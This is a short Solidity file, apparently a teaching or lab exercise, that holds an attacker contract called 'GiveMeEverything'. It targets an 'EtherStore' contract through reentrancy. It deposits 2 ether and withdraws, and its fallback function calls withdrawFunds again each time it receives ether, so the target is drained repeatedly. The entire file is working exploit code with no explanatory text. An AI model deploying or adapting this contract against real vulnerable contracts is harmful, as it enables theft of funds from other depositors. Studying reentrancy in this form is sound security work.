pragma solidity ^0.4.19;

import "5.sol";

contract GiveMeEverything {
    EtherStore public store;
    
    constructor() payable {
        
    }
    
    function startAttack(address _addr) public {
        store = EtherStore(_addr);
        
        store.depositFunds.value(2000000000000000000 wei)();
        store.withdrawFunds(500000000000000000 wei);
    }
    
    function() public payable {
        store.withdrawFunds(500000000000000000 wei);
    }
    
}